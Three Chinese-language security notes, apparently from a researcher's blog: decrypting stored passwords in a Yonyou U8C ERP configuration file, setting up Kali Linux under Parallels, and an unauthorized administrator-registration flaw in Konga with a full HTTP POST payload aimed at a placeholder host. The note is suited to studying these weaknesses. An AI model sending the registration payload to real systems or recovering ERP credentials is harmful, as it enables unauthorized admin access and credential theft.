entry.title: 用友N8C-ERP密码解密
entry.content:
配置文件

文件存放位置：L:\U8CERP\ierp\bin\prop.xml

看起来挺像正常的明文密码2333

密码解密

解密方法：L:\U8CERP\middleware\mw.jar -> decode()

文件太杂直接全局搜索nc.vo.framework.rsa;，发现藏在U8CERP\external\lib\basic.jar里

idea把这两个jar包导入，直接解密（用户密码也一样的加密）。

entry.title: Parallels安装kali折腾笔记
entry.content:
Parallels安装kali折腾笔记

安装版本：

kali-linux-2020.2-installer-amd64.iso
Parallels 16.0.1

Change Aliyun source

nano /etc/apt/sources.list 

#deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib#deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib

Update Soft

apt-get cleanapt-get updateapt-get upgrade -yapt-get dist-upgrade -yapt-get install dkms kpartx printer-driver-postscript-hp

Install Parallels Tools

sudo -seject /dev/cdrom 然后挂载toolsmkdir /media/ptmkdir /root/Desktop/ptmount /dev/cdrom /media/ptcp -r /media/pt/  /root/Desktop/ptcd /root/Desktop/pt/pt./install

无法安装linux-headers

接下来的错误都是要查看日志文件了cat /var/log/parallels-tools-install.log如果是无法安装linux-headers的话，就要手动安装。 先查看内核版本uname -a然后来这里http://http.kali.org/kali/pool/main/l/linux/下载三个对应内核版本的安装包手动安装国内使用aliyun下载更快 https://mirrors.aliyun.com/kali/pool/main/l/linux/linux-kbuild: linux-kbuild-xxxx_amd64.deblinux-header-common: linux-headers-xxxx-common_xxxx_amd64.deblinux-compiler-gcc: linux-compiler-gcc-xxx-amd64.deblinux-headers: linux-headers-xxxx_amd64.deb下载完成后，用dpkg命令安装deb包。dpkg -i xxxxx.deb

装完Tools后登陆白屏问题解决

关闭3D加速

参考

https://www.sqlsec.com/2019/12/pd.html

https://cloud.tencent.com/developer/article/1561336

https://forum.parallels.com/threads/how-to-install-the-parallels-tools-on-kali-linux.348342/

entry.title: Konga Unauthorized registration
entry.content:
Konga Unauthorized registration

简介

Konga不是官方应用。与Kong没有联系。
官方：https://github.com/pantsel/konga

后台任意管理员注册

默认开放注册
直接发送请求即可

Payload ：

POST /register HTTP/1.1Host: xx.qq.comConnection: closeAccept: application/json, text/plain, */*Sec-Fetch-Dest: emptyconnection-id: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36Origin: https://xx.qq.comSec-Fetch-Site: same-originSec-Fetch-Mode: corsReferer: https://xx.qq.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Length: 106{"username":"admintest","email":"testa@qq.com","password":"qqAAwiqk1","password_confirmation":"qqAAwiqk1"}
